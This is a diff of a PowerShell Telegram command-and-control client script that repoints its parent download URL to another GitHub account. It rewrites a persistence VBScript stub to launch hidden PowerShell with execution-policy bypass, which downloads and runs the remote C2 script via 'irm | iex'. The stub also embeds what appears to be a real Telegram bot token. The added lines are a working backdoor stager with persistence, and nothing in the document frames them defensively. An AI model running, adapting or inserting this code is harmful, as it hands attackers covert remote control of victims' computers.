@@ -14,7 +14,7 @@ SEE README FOR MORE INFO
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "Xm3f8xgzwe@" # 'password' for this connection (computername by default)
 $global:errormsg = 1 # 1 = return error messages to chat (off by default)
-$parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://raw.githubusercontent.com/poiuztreq/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 $AcceptedSession=""
@@ -407,7 +407,7 @@ if ($newScriptPath.Length -lt 100){
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File """ & userProfile & "\Desktop\test\copy.ps1""", 0, True
+objShell.Run "powershell -NoP -Ep Bypass -W H -C $tg='6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI';irm https://raw.githubusercontent.com/poiuztreq/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex""", 0, True
 '@
 
 $pth = "$env:USERPROFILE\Desktop\test\service.vbs"
